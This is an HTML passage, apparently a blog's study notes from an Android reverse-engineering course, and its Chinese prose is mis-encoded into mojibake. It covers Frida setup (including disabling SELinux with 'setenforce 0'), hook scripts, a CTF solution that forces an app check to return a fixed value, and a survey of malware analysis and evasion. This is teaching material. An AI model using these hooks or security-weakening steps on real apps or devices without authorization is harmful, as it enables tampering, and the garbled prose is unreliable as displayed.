class="headerlink" title="frida æ¡†æ¶"></a>frida æ¡†æ¶</h3><p><strong>Frida</strong>æ˜¯ä¸€æ¬¾åŸºäº<code>python + javascript</code> çš„<code>hook</code>æ¡†æ¶ï¼Œé€‚ç”¨äº<code>android/ios/linux/win/osx</code>ç­‰å¹³å°ã€‚</p><p>å®‰è£…ï¼š</p><p>ç”µè„‘ç«¯ï¼š<code>pip install frida-tools</code>ã€‚</p><p>Androidç«¯ï¼šä»<code>github release</code>é¡µé¢ä¸‹è½½<code>frida-server</code>ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> adb root <span class="hljs-comment"># might be required</span><br><span class="hljs-variable">$</span> adb push frida<span class="hljs-literal">-server</span> /<span class="hljs-keyword">data</span>/local/tmp/ <br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;chmod 755 /data/local/tmp/frida-server&quot;</span><br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;/data/local/tmp/frida-server &amp;&quot;</span><br></code></pre></td></tr></table></figure><p>ç‰¹åˆ«çš„ï¼Œå¦‚æœåä¸ºæ‰‹æœºå‡ºç°ï¼š</p><p>selinuxæŠ¥é”™</p><p>éœ€è¦ï¼š<code>setenforce 0</code>ã€‚</p><p>è‡³æ­¤å®‰è£…å®Œæ¯•ï¼Œè¿™é‡Œç»ƒä¹ ä¸€ä¸ª<code>Demo</code>ã€‚ä»¥ä¸‹æ˜¯<code>apk</code>çš„æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> Button mBtnInvokeFunc;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        mBtnInvokeFunc = findViewById(R.id.btn_invoke_func);<br>        setOnClickListener();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOnClickListener</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">OnClick</span> <span class="hljs-variable">onClick</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OnClick</span>();<br>        mBtnInvokeFunc.setOnClickListener(onClick);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hookFunction</span><span class="hljs-params">()</span>&#123;<br>        Log.d(<span class="hljs-string">&quot;hookFunction&quot;</span>, <span class="hljs-string">&quot;UnHooked.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OnClick</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>            Intent intent;<br>            <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>                <span class="hljs-keyword">case</span> R.id.btn_invoke_func:<br>                    hookFunction();<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦<code>hook</code>çš„æ˜¯<code>MainActivity</code>ä¸­çš„<code>hookfunction</code>ã€‚<code>python hook</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;top.handsome.toturial&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;top.handsome.toturial.MainActivity&#x27;);</span><br><span class="hljs-string">    var hookFunction = MainActivity.hookFunction;</span><br><span class="hljs-string">    hookFunction.implementation = function () &#123;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><h2 id="ç¬¬äºŒå¤©-01æœˆ14æ—¥"><a href="#ç¬¬äºŒå¤©-01æœˆ14æ—¥" class="headerlink" title="ç¬¬äºŒå¤© 01æœˆ14æ—¥"></a>ç¬¬äºŒå¤© 01æœˆ14æ—¥</h2><p>Why Androidï¼š<code>APP</code>-ç§»åŠ¨äº’è”ç½‘çš„å…¥å£ã€å®‰å…¨ç ”ç©¶çš„â€œäº¤é›†â€ï¼Œ<code>Android</code>çš„å¸‚åœºä»½é¢å¾ˆå¤§ã€‚</p><h3 id="Androidåº”ç”¨ç¨‹åº"><a href="#Androidåº”ç”¨ç¨‹åº" class="headerlink" title="Androidåº”ç”¨ç¨‹åº"></a>Androidåº”ç”¨ç¨‹åº</h3><h4 id="APKæ–‡ä»¶æ ¼å¼"><a href="#APKæ–‡ä»¶æ ¼å¼" class="headerlink" title="APKæ–‡ä»¶æ ¼å¼"></a>APKæ–‡ä»¶æ ¼å¼</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_structure.png" alt="img"></p><h4 id="activityç”Ÿå‘½å‘¨æœŸ"><a href="#activityç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="activityç”Ÿå‘½å‘¨æœŸ"></a>activityç”Ÿå‘½å‘¨æœŸ</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/activity_lifecycle.png" alt="img"></p><h3 id="é€†å‘æŠ€æœ¯å’Œæ–¹æ³•"><a href="#é€†å‘æŠ€æœ¯å’Œæ–¹æ³•" class="headerlink" title="é€†å‘æŠ€æœ¯å’Œæ–¹æ³•"></a>é€†å‘æŠ€æœ¯å’Œæ–¹æ³•</h3><h4 id="é€†å‘æµç¨‹"><a href="#é€†å‘æµç¨‹" class="headerlink" title="é€†å‘æµç¨‹"></a>é€†å‘æµç¨‹</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/liucheng.png" alt="img"></p><p>åç¼–è¯‘é˜¶æ®µï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_decom.png" alt="img"></p><p>ç›®æ ‡å®šä½ï¼š</p><ul><li>å…³é”®å­—å®šä½ï¼šå¸¸è§„çš„æœç´¢ã€<code>grep</code>åç¼–è¯‘åçš„é™æ€ä»£ç ã€åŠ¨æ€åŠ è½½çš„ä»£ç ã€ç›‘æ§æ–‡ä»¶å˜åŒ–ã€‚</li><li>èµ„æºå®šä½ï¼šå®šä½<code>UI</code>ä¸­çš„èµ„æºå˜é‡åï¼Œå¦‚æŒ‰é’®ã€‚<code>res</code>ç›®å½•ä¸­å¯»æ‰¾å˜é‡å¯¹åº”çš„ç´¢å¼•å€¼ã€‚åœ¨<code>smali</code>ä»£ç ä¸­<code>grep</code>æ‰€æœ‰å¯¹è¯¥ç´¢å¼•çš„å¼•ç”¨ã€‚</li><li>æ—¥å¿—å®šä½ï¼š<code>adb logcat | grep</code>ï¼Œ<code>APP</code>ç›®å½•ä¸‹çš„æ—¥å¿—æ–‡ä»¶ã€<code>sdcard</code>ä¸‹çš„æ—¥å¿—æ–‡ä»¶ã€‚æ‰“å¼€<code>APP</code>å†…ç½®çš„æ—¥å¿—å¼€å…³ï¼šé‡æ‰“åŒ…ï¼Œ<code>hook</code>ï¼Œ<code>smali</code>æ³¨å…¥ã€‚</li><li>è°ƒç”¨æ ˆè·Ÿè¸ªï¼šå»<code>hook</code>ç³»ç»Ÿå‡½æ•°æ‰“å°<code>callback</code>ã€‚</li></ul><p>æ ¸å¿ƒç›®æ ‡é€†å‘ï¼š</p><ul><li><p>é™æ€åˆ†æ</p><ul><li>ç›´æ¥åˆ†æsmaliä»£ç </li><li>åˆ†æä¼ªjavaä»£ç </li><li>ç›´æ¥åˆ†æarmæŒ‡ä»¤</li><li>åˆ†æä¼ªc++ä»£ç </li></ul></li><li><p>åŠ¨æ€è°ƒè¯•</p><ul><li>Android Studioæ— æºç è°ƒè¯•</li><li>IDAè°ƒè¯•so</li><li>HookæŠ€æœ¯</li><li>æ³¨å…¥åˆ°ç›®æ ‡ä»£ç ï¼Œæ”¹å˜æ‰§è¡Œç»“æœã€‚</li><li>è·å–æŸä¸€çŠ¶æ€ä¸‹çš„å˜é‡å€¼ã€‚</li><li>hookçš„æœ¬è´¨æ˜¯ä»£ç æ³¨å…¥</li><li>Xposedã€Fridaã€‚</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_xposed.png" alt="img"></p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_hook.png" alt="img"></p><p>ä½¿ç”¨Frida hook appï¼š</p><ul><li>ä½¿ç”¨åœºæ™¯ï¼šrootè®¾å¤‡ç›´æ¥è¿è¡Œfrida-serverã€érootè®¾å¤‡é‡æ‰“åŒ…Frida-garget.soã€‚</li><li>ä¸¤ç§æ¨¡å¼ï¼šAttachå·²æœ‰è¿›ç¨‹ä¸Šé™„åŠ ã€Spawnæ–°èµ·ä¸€ä¸ªè¿›ç¨‹ã€‚</li></ul></li><li><p>åŠ¨é™ç»“åˆ</p></li><li><p>æ‰“é€ è‡ªå·±çš„é€†å‘å·¥å…·é“¾</p></li></ul><h3 id="åº”ç”¨å®‰å…¨é˜²æŠ¤ä¸å¯¹æŠ—"><a href="#åº”ç”¨å®‰å…¨é˜²æŠ¤ä¸å¯¹æŠ—" class="headerlink" title="åº”ç”¨å®‰å…¨é˜²æŠ¤ä¸å¯¹æŠ—"></a>åº”ç”¨å®‰å…¨é˜²æŠ¤ä¸å¯¹æŠ—</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_protect.png" alt="img"></p><h4 id="ä»£ç æ··æ·†åŠå¯¹æŠ—"><a href="#ä»£ç æ··æ·†åŠå¯¹æŠ—" class="headerlink" title="ä»£ç æ··æ·†åŠå¯¹æŠ—"></a>ä»£ç æ··æ·†åŠå¯¹æŠ—</h4><p>åˆ©ç”¨åç¼–è¯‘å·¥å…·çš„bugæˆ–æ¼æ´ï¼ŒAndroidManifest.xmlï¼Œdexï¼Œsoã€‚è½¬æ¢æˆä¼ªä»£ç æ—¶çš„bugï¼ŒSmali -&gt; javaï¼ŒArmæŒ‡ä»¤ -&gt; C++ã€‚é“¾æ¥èµ„æºæ–‡ä»¶æ—¶çš„bugï¼Œå¦‚ç‰¹æ®Šçš„èµ„æºæ–‡ä»¶ï¼Œè¶…é•¿çš„èµ„æºidã€‚</p><p>å°†ä»£ç å˜å¾—éš¾ä»¥é˜…è¯»ï¼š1ã€å˜é‡åã€ç±»åã€æ–¹æ³•åæ··æ·†ã€‚2ã€å­—ç¬¦ä¸²åŠ å¯†ã€‚3ã€æ§åˆ¶æµæ··æ·†ï¼Œ</p><p>ä»£ç æ··æ·†å·¥å…·ï¼šJavaä»£ç ï¼šProGuardã€DexGuardã€‚C++ä»£ç ï¼šOLLVMã€‚</p><h4 id="åè°ƒè¯•æŠ€æœ¯åŠå¯¹æŠ—"><a href="#åè°ƒè¯•æŠ€æœ¯åŠå¯¹æŠ—" class="headerlink" title="åè°ƒè¯•æŠ€æœ¯åŠå¯¹æŠ—"></a>åè°ƒè¯•æŠ€æœ¯åŠå¯¹æŠ—</h4><p>å¯¹æŠ—ä»£ç æ··æ·†</p><ul><li>å˜é‡åã€ç±»åã€æ–¹æ³•åæ··æ·†<ul><li>å˜é‡é‡å‘½åã€jebã€é‡æ‰“åŒ…</li><li>å¯»æ‰¾è€ç‰ˆæœ¬app</li><li>æ ¹æ®å¼€æºä»£ç æ˜ å°„</li><li>è‡ªåŠ¨åŒ–ã€è‡ªåŠ¨åŒ–ç›¸ä¼¼ä»£ç æ£€æµ‹</li></ul></li><li>å­—ç¬¦ä¸²åŠ å¯†<ul><li>é™æ€åˆ†ææ›¿æ¢</li><li>åŠ¨æ€hook</li></ul></li><li>æ§åˆ¶æµæ··æ·†<ul><li>ä¼˜åŒ–åç¼–è¯‘å·¥å…·</li><li>ç¬¦å·æ‰§è¡Œ</li></ul></li></ul><h4 id="åŠ å£³å’Œè„±å£³"><a href="#åŠ å£³å’Œè„±å£³" class="headerlink" title="åŠ å£³å’Œè„±å£³"></a>åŠ å£³å’Œè„±å£³</h4><p>dexåŠ å›ºçš„æµç¨‹ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dex_protect.png" alt="img"></p><h3 id="é¢˜ç›®-amp-ç»éªŒåˆ†äº«"><a href="#é¢˜ç›®-amp-ç»éªŒåˆ†äº«" class="headerlink" title="é¢˜ç›®&amp;ç»éªŒåˆ†äº«"></a>é¢˜ç›®&amp;ç»éªŒåˆ†äº«</h3><h3 id="geekpwn-matryoshka"><a href="#geekpwn-matryoshka" class="headerlink" title="geekpwn matryoshka"></a>geekpwn matryoshka</h3><p>è¿™ä¸ªæˆ‘åœ¨å®‰å“æ¨¡æ‹Ÿå™¨ä¸­å®‰è£…ï¼Œ<code>apk install</code>å³å¯ã€‚éšåé€†å‘é€»è¾‘ï¼Œçœ‹åˆ°åªæœ‰MainAcitvity.getResult()è¿”å›â€œ167042853â€æ‰å¯ä»¥ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨<code>frida hook</code> <code>getResult</code>å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;com.geekpwn_ctf&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var String = Java.use(&quot;java.lang.String&quot;);</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;com.geekpwn_ctf.MainActivity&#x27;);</span><br><span class="hljs-string">    var getResult = MainActivity.getResult;</span><br><span class="hljs-string">    getResult.implementation = function () &#123;</span><br><span class="hljs-string">        var ss = &quot;167042853&quot;;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">        return String.$new(ss);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><p>åœ¨<code>hook</code>çŠ¶æ€ä¸‹ç‚¹å‡»<code>pwn</code>æŒ‰é’®è·å¾—ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/geekpwn_1.png" alt="img"></p><p>ä½†æ˜¯è¿™é“é¢˜ç›®ç­”æ¡ˆåœ¨<code>META-INF</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œå…¶ä¸‹å¤šä¸€ä¸ª<code>CERT .SF</code>æ–‡ä»¶ï¼Œä½¿ç”¨<code>file</code>åˆ¤æ–­å®ƒæ˜¯ä¸€ä¸ª<code>zip</code>æ–‡ä»¶ï¼Œç„¶åç”¨<code>m$W2h</code>ä½œä¸ºå¯†ç å¾ªç¯è§£å‹è·å¾—ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç ï¼Œå¾—åˆ°<code>MD5</code>ä¸²ï¼ŒæŸ¥è¯¢å¾—åˆ°ç­”æ¡ˆã€‚</p><h2 id="ç¬¬ä¸‰å¤©-01æœˆ15æ—¥"><a href="#ç¬¬ä¸‰å¤©-01æœˆ15æ—¥" class="headerlink" title="ç¬¬ä¸‰å¤© 01æœˆ15æ—¥"></a>ç¬¬ä¸‰å¤© 01æœˆ15æ—¥</h2><p>ç§»åŠ¨æ¶æ„ä»£ç åˆ†æ</p><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å„ç§æ•°æ®å±•ç°äº†ä»Šå¤©å®‰å“å¹³å°ä¸Šçš„å®‰å…¨å¨èƒæ„ˆæ¥æ„ˆå¤šã€‚</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_1.png" alt="img"></p><p>æ”»å‡»æ‰‹æ®µçš„å¤šæ ·åŒ–ï¼Œä»¥åŠå®‰å“ç«¯å‹’ç´¢ç—…æ¯’ï¼Œæ¶æ„è‰²æƒ…è½¯ä»¶æ•°é‡æŒç»­å¢é•¿ã€‚</p><p>ä»¥åŠç›®å‰åœ¨èµ„äº§æ–¹é¢çš„å¨èƒï¼Œæ”»å‡»æ–¹å¼å¤šå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_2.png" alt="img"></p><p>ä»¥åŠçŸ­ä¿¡æ–¹é¢çš„ç¤¾ä¼šå·¥ç¨‹ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_3.png" alt="img"></p><p>ä»¥åŠæŒç»­æ‰©å¤§çš„å¨èƒæ”»å‡»é¢ï¼Œè¡¨ç°ä¸ºåœ°ä¸‹ç¤¾ä¼šå·¥ç¨‹æ•°æ®åº“ï¼ŒåŸå§‹çš„æ•°æ®ç§¯ç´¯ã€å®Œå–„çš„é»‘äº§åˆ†å·¥åä½œä½“ç³»ã€‚</p><p>ç—…æ¯’çš„å‘½åä½“ç³»ï¼šä¸€èˆ¬æ ¼å¼ä¸ºã€&lt;ç—…æ¯’å‰ç¼€&gt;.&lt;ç—…æ¯’å&gt;.&lt;ç—…æ¯’åç¼€&gt;ï¼Œå¦‚Worm.Sasser.bã€‚</p><p>è¶‹åŠ¿ï¼šæ¶æ„ä»£ç è§„æ¨¡æŒç»­ç¨³å®šå¢é•¿ã€æ¶æ„ä»£ç é«˜åº¦äº§ä¸šåŒ–ã€ç§»åŠ¨ç«¯æˆä¸ºAPTæ–°æˆ˜åœºã€‚</p><h3 id="æ¶æ„ä»£ç åˆ†æ"><a href="#æ¶æ„ä»£ç åˆ†æ" class="headerlink" title="æ¶æ„ä»£ç åˆ†æ"></a>æ¶æ„ä»£ç åˆ†æ</h3><h4 id="APKæ ¼å¼"><a href="#APKæ ¼å¼" class="headerlink" title="APKæ ¼å¼"></a>APKæ ¼å¼</h4><p>åˆæ˜¯è€ç”Ÿå¸¸è°ˆçš„apkæ–‡ä»¶æ ¼å¼ï¼Œå®ƒæ˜¯zipæ ¼å¼ï¼Œç¼–ç ä¸ºULEB128ã€‚</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_4.png" alt="img"></p><h4 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h4><p>å¸¸ç”¨å·¥å…·ï¼šSmaliviewerã€APKTOOL&#x2F;baksamliã€Dex2jar&#x2F;jd-guiã€JEBã€IDAã€AndroidKillerã€AndroidGuardã€Virustotalã€‚</p><p>åæ··æ·†ï¼š<a href="http://apk-deguard.com/">http://apk-deguard.com/</a></p><ul><li>å¿«è¯»å®šä½æ³•ï¼Œæ•æ„ŸAPIæŸ¥æ‰¾ã€‚</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_5.png" alt="img"></p><ul><li>å¯¹æ¯”æ³•ï¼Œç™½åº”ç”¨æ¯”è¾ƒã€‚</li></ul><p><img src="http://handsomedog.top/wp-content/uploads/2020/01/antian_6.png" alt="img"></p><ul><li>ä»£ç æµç¨‹æ³•ã€AndroidManifest.xmlå…¥æ‰‹</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_7.png" alt="img"></p><ul><li>ä¸€ä¸ªä¸ªç±»çœ‹</li></ul><h4 id="åŠ¨æ€åˆ†æ"><a href="#åŠ¨æ€åˆ†æ" class="headerlink" title="åŠ¨æ€åˆ†æ"></a>åŠ¨æ€åˆ†æ</h4><p>å·¥å…·ï¼šAndebugã€IDAã€smali hookã€xposed&#x2F;substrate&#x2F;fridaã€wireshark&#x2F;tcpdump&#x2F;burpsuite&#x2F;findler2ã€‚</p><p>æ„Ÿè§‰è¿™å¤šç”¨çš„è¿˜æ˜¯HookæŠ€æœ¯ã€‚</p><h4 id="åˆ†æç³»ç»Ÿ"><a href="#åˆ†æç³»ç»Ÿ" class="headerlink" title="åˆ†æç³»ç»Ÿ"></a>åˆ†æç³»ç»Ÿ</h4><p>ç›¸å…³å·¥å…·ï¼šDroidBoxã€AndroGuardã€InpseckageåŸºäºxposedã€RMSï¼ˆantiyï¼‰ã€cuckooï¼ˆ<a href="https://cuckoosandbox.org)/">https://cuckoosandbox.orgï¼‰</a></p><p>æ–¹æ³•ä¸€ï¼šæ¨¡æ‹Ÿå™¨</p><p>emulator -tcpdump x.pcap</p><p>æ–¹æ³•äºŒï¼štcpdump for ARM</p><p><a href="http://www.strazzere.com/android/tcpdump%E3%80%81%E9%9C%80%E8%A6%81root%E6%9D%83%E9%99%90%E3%80%82">http://www.strazzere.com/android/tcpdumpã€éœ€è¦rootæƒé™ã€‚</a></p><p>æ–¹æ³•ä¸‰ï¼š</p><p>wifi + wireshark</p><h4 id="æ¶æ„ä»£ç -åœ¨çº¿ç³»ç»Ÿ"><a href="#æ¶æ„ä»£ç -åœ¨çº¿ç³»ç»Ÿ" class="headerlink" title="æ¶æ„ä»£ç -åœ¨çº¿ç³»ç»Ÿ"></a>æ¶æ„ä»£ç -åœ¨çº¿ç³»ç»Ÿ</h4><ul><li>Vitrustotal <a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li><li>Sandroid <a href="http://sanddroid.xjtu.edu.cn/">http://sanddroid.xjtu.edu.cn</a></li><li>Koodous <a href="https://koodous.com/">https://koodous.com/</a></li><li>Janus <a href="https://www.appscan.io/">https://www.appscan.io</a></li></ul><p>æ›´åŠ æ³¨é‡åˆ†æå·¥å…·ã€æ–¹æ³•ã€æ‰‹æ®µç­‰ã€‚ä»¥åŠå·¥ç¨‹åŒ–å¯¹æŠ—ï¼Œä»¥åŠç”Ÿæ€åˆä½œç©ºé—´ï¼Œå’Œå‚å•†å¯¹äºåç—…æ¯’çš„æ€åº¦ã€‚</p><h3 id="ç§»åŠ¨å¨èƒæƒ…æŠ¥"><a href="#ç§»åŠ¨å¨èƒæƒ…æŠ¥" class="headerlink" title="ç§»åŠ¨å¨èƒæƒ…æŠ¥"></a>ç§»åŠ¨å¨èƒæƒ…æŠ¥</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_8.png" alt="img"></p><h3 id="ç§»åŠ¨å¨èƒå¯¹æŠ—"><a href="#ç§»åŠ¨å¨èƒå¯¹æŠ—" class="headerlink" title="ç§»åŠ¨å¨èƒå¯¹æŠ—"></a>ç§»åŠ¨å¨èƒå¯¹æŠ—</h3><h4 id="å¯¹æŠ—åˆ†æå·¥å…·"><a href="#å¯¹æŠ—åˆ†æå·¥å…·" class="headerlink" title="å¯¹æŠ—åˆ†æå·¥å…·"></a>å¯¹æŠ—åˆ†æå·¥å…·</h4><p>Ptraceè‡ªèº«ã€httpsæ ¡éªŒã€æ£€æµ‹çˆ¶è¿›ç¨‹ã€ä¼ª&#x2F;åŠ å¯†ã€Axml &#x2F;èµ„æºæ–‡ä»¶å¯¹æŠ—ã€è‡ªæ ¡éªŒã€ç•¸å½¢åŒ…ã€ä»£ç éšè—ã€åŠ å£³ã€æ··æ·†ã€åŠ å¯†ã€åå°„è°ƒç”¨ã€‚</p><h4 id="å¯¹æŠ—ç”¨æˆ·æ„ŸçŸ¥"><a href="#å¯¹æŠ—ç”¨æˆ·æ„ŸçŸ¥" class="headerlink" title="å¯¹æŠ—ç”¨æˆ·æ„ŸçŸ¥"></a>å¯¹æŠ—ç”¨æˆ·æ„ŸçŸ¥</h4><p>éšè—å›¾æ ‡ã€é€æ˜å›¾æ ‡ã€é™é»˜ä¸‹è½½&#x2F;å®‰è£…ã€é¢„è£…ã€æ¤å…¥çŸ¥ååº”ç”¨ã€ä¼ªè£…ç³»ç»Ÿåº”ç”¨ã€ISPåŠ«æŒã€é‚®ä»¶ã€ç¤¾å·¥ã€‚</p><h4 id="åè·Ÿè¸ª"><a href="#åè·Ÿè¸ª" class="headerlink" title="åè·Ÿè¸ª"></a>åè·Ÿè¸ª</h4><p>åˆ©ç”¨çŸ­é“¾æ¥ã€åŸŸåéšç§ä¿æŠ¤ã€ä¼ªåŸºç«™ã€åŠ¨æ€DNSã€ç›—ç”¨ä»–äººä¿¡æ¯ã€ä½¿ç”¨äº‘æœåŠ¡<br>ã€å…¥ä¾µæ— å…³ç«™ç‚¹ã€‚</p><h3 id="æ¶æ„ä»£ç å±‚æ¬¡åˆ©ç”¨"><a href="#æ¶æ„ä»£ç å±‚æ¬¡åˆ©ç”¨" class="headerlink" title="æ¶æ„ä»£ç å±‚æ¬¡åˆ©ç”¨"></a>æ¶æ„ä»£ç å±‚æ¬¡åˆ©ç”¨</h3><h4 id="Applicationå±‚"><a href="#Applicationå±‚" class="headerlink" title="Applicationå±‚"></a>Applicationå±‚</h4><p>ä¸»è¦å¨èƒï¼šæµæ°“æ¨å¹¿ï¼Œæ¶æ„é¢„è£…ã€æµæ°“å¹¿å‘Šã€é’“é±¼åº”ç”¨ã€æ¬ºè¯ˆã€‚</p><h4 id="FrameWorkå±‚"><a href="#FrameWorkå±‚" class="headerlink" 